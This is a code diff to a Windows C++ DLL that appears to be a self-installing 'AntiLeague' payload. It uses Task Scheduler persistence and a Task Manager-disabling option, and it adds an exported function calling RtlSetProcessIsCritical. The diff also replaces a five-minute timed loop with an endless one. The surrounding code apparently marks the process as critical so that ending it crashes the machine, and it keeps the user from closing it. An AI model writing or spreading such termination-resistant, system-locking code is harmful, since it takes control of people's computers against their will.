@@ -1,6 +1,5 @@
 ﻿#include "Install.h"
 #include "payload.h"
-#include <chrono>
 #include <comdef.h>
 #include <taskschd.h>
 #include <ShlObj_core.h>
@@ -127,6 +126,11 @@ void Uninstall()
 
 extern "C"
 {
+    PAYLOAD_API void DisableCritical()
+    {
+        RtlSetProcessIsCritical(FALSE, NULL, FALSE);
+    }
+
     PAYLOAD_API bool AntiLeague()
     {
         CoInitializeEx(NULL, COINIT_MULTITHREADED);
@@ -135,7 +139,7 @@ extern "C"
         wchar_t szExeFileName[MAX_PATH];
         GetModuleFileName(NULL, szExeFileName, MAX_PATH);
 
-        for (auto start = std::chrono::steady_clock::now(), now = start; now < start + std::chrono::minutes{ 5 }; now = (isFirstInstance) ? (std::chrono::steady_clock::time_point::min)() : std::chrono::steady_clock::now())
+        for (;;)
         {
         #ifdef DisableTaskMGR
         {
